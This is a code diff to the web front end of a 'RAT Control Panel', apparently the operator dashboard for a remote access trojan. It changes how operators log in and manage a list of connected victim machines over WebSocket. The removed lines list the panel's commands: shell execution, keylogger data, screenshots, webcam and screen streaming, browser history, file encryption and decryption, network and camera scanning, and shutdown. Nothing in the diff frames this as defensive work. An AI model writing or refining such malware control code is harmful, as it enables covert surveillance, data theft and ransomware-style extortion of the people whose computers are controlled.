@@ -146,39 +146,8 @@
   </style>
 </head>
 <body class="text-gray-100 min-h-screen">
-  <!-- Login Overlay -->
-  <div id="login-overlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-    <div class="glass-effect rounded-2xl p-8 w-full max-w-md mx-4">
-      <div class="text-center mb-6">
-        <i class="fas fa-shield-alt text-4xl text-blue-400 mb-4"></i>
-        <h1 class="text-3xl font-bold text-white mb-2">RAT Control Panel</h1>
-        <p class="text-gray-300">Secure access required</p>
-      </div>
-      
-      <form id="login-form" class="space-y-4">
-        <div>
-          <label class="block text-sm font-medium text-gray-300 mb-2">Username</label>
-          <input type="text" id="login-username" required
-                 class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
-        </div>
-        
-        <div>
-          <label class="block text-sm font-medium text-gray-300 mb-2">Password</label>
-          <input type="password" id="login-password" required
-                 class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
-        </div>
-        
-        <div id="login-error" class="text-red-400 text-sm hidden"></div>
-        
-        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-200">
-          <i class="fas fa-sign-in-alt mr-2"></i>Login
-        </button>
-      </form>
-    </div>
-  </div>
-
   <!-- Main Application -->
-  <div id="main-app" class="hidden min-h-screen flex">
+  <div id="main-app" class="min-h-screen flex">
     <!-- Sidebar - Client List -->
     <div class="w-80 bg-gray-800 bg-opacity-50 p-6 overflow-y-auto scrollbar-thin">
       <div class="mb-6">
@@ -399,45 +368,11 @@
     let lastClientList = [];
     let commandHistory = [];
     let historyIndex = -1;
-    let isAuthenticated = false;
     let reconnectAttempts = 0;
     let maxReconnectAttempts = 5;
 
-    // Command suggestions
-    const commands = [
-      { cmd: '/help', desc: 'Show available commands' },
-      { cmd: '/exec', desc: 'Execute shell command' },
-      { cmd: '/screenshot', desc: 'Take screenshot' },
-      { cmd: '/download', desc: 'Download file' },
-      { cmd: '/upload', desc: 'Upload file' },
-      { cmd: '/ls', desc: 'List directory contents' },
-      { cmd: '/cd', desc: 'Change directory' },
-      { cmd: '/systeminfo', desc: 'Show system information' },
-      { cmd: '/history', desc: 'Show browser history' },
-      { cmd: '/keylogger', desc: 'Show keylogger data' },
-      { cmd: '/ps', desc: 'Show running processes' },
-      { cmd: '/kill', desc: 'Kill process by PID' },
-      { cmd: '/msgbox', desc: 'Show a message box on the client' },
-      { cmd: '/shell', desc: 'Execute command in interactive shell' },
-      { cmd: '/screenstream_start', desc: 'Start screen streaming' },
-      { cmd: '/screenstream_stop', desc: 'Stop screen streaming' },
-      { cmd: '/webcam_list', desc: 'List available webcams' },
-      { cmd: '/webcam_start', desc: 'Start webcam stream (e.g., /webcam_start 1)' },
-      { cmd: '/webcam_stop', desc: 'Stop webcam stream' },
-      { cmd: '/encrypt', desc: 'Encrypt files/folders' },
-      { cmd: '/decrypt', desc: 'Decrypt files/folders' },
-      { cmd: '/scan_cameras', desc: 'Scan for network cameras' },
-      { cmd: '/network_info', desc: 'Show network information' },
-      { cmd: '/network_scan', desc: 'Scan network for hosts' },
-      { cmd: '/shutdown', desc: 'Shutdown system' },
-      { cmd: '/restart', desc: 'Restart system' }
-    ];
-
     // DOM Elements
-    const loginOverlay = document.getElementById('login-overlay');
     const mainApp = document.getElementById('main-app');
-    const loginForm = document.getElementById('login-form');
-    const loginError = document.getElementById('login-error');
     const connectionStatus = document.getElementById('connection-status');
     const clientList = document.getElementById('client-list');
     const clientCount = document.getElementById('client-count');
@@ -539,44 +474,11 @@
       if (placeholder) placeholder.remove();
     }
 
-    // Authentication
-    async function login(username, password) {
-      try {
-        const response = await fetch('/login', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ username, password })
-        });
-        
-        const data = await response.json();
-        
-        if (response.ok && data.token) {
-          localStorage.setItem('rat_token', data.token);
-          isAuthenticated = true;
-          loginOverlay.classList.add('hidden');
-          mainApp.classList.remove('hidden');
-          connectWebSocket();
-          showNotification('Successfully logged in!', 'success');
-          return true;
-        } else {
-          throw new Error(data.error || 'Login fehlgeschlagen');
-        }
-      } catch (error) {
-        loginError.textContent = error.message;
-        loginError.classList.remove('hidden');
-        showNotification(error.message, 'error');
-        return false;
-      }
-    }
-
     // WebSocket Connection
     function connectWebSocket() {
       const token = localStorage.getItem('rat_token');
       if (!token) {
-        console.log('No token available, showing login');
-        showLogin();
+        window.location.href = '/login';
         return;
       }
       
@@ -634,7 +536,7 @@
         if (event.code === 4401) {
           // Unauthorized - token expired or invalid
           localStorage.removeItem('rat_token');
-          showLogin();
+          window.location.href = '/login';
           showNotification('Session expired or invalid. Please log in again.', 'warning');
         } else if (reconnectAttempts < maxReconnectAttempts) {
           reconnectAttempts++;
@@ -1294,14 +1196,6 @@
 
     // Event Listeners
     function setupEventListeners() {
-      // Login form
-      loginForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const username = document.getElementById('login-username').value;
-        const password = document.getElementById('login-password').value;
-        await login(username, password);
-      });
-      
       // Send command
       sendCommand.addEventListener('click', sendCommandToClients);
       
@@ -1421,15 +1315,15 @@
       // Check for existing token
       const token = localStorage.getItem('rat_token');
       if (token) {
-        loginOverlay.classList.add('hidden');
         mainApp.classList.remove('hidden');
-        isAuthenticated = true;
         connectWebSocket();
+      } else {
+        window.location.href = '/login';
       }
       
       // Auto-refresh client list every 30 seconds
       setInterval(() => {
-        if (isAuthenticated && ws && ws.readyState === WebSocket.OPEN) {
+        if (ws && ws.readyState === WebSocket.OPEN) {
           requestClientList();
         }
       }, 30000);
